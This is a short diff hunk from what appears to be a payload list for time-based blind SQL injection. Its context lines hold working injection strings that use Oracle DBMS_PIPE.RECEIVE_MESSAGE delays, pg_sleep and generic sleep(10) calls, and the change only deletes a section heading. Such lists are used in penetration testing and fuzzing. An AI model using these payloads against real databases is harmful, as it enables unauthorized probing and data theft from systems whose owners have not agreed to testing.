@@ -65,7 +65,6 @@ pg_sleep(10)--
 SAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),10) AND '1337'='1337
 ') AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),10) AND ('1337'='1337
 ) AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),10) AND (1337=1337
-Generic Time Based SQL Injection Payloads:
 (sleep(10))--
 (sleep(10))
 ";sleep 10--
